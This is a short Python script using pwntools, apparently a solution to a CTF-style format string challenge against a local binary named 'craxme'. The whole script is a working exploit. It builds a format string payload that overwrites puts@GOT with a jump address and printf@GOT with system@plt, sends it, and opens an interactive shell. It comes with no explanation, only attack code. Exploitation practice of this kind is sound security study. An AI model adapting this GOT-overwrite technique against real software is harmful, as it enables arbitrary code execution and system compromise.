#coding=utf-8
from pwn import *
p=process('./craxme')
elf=ELF('./craxme')
context.log_level = 'debug'

puts_got=elf.got['puts']
systemplt = 0x08048410
printfgot = 0x0804a010 
payload4 = fmtstr_payload(7, {puts_got:0x0804858B,printfgot:systemplt})

p.recvuntil('Give me magic :')
gdb.attach(p)
p.sendline(payload4)
p.interactive()

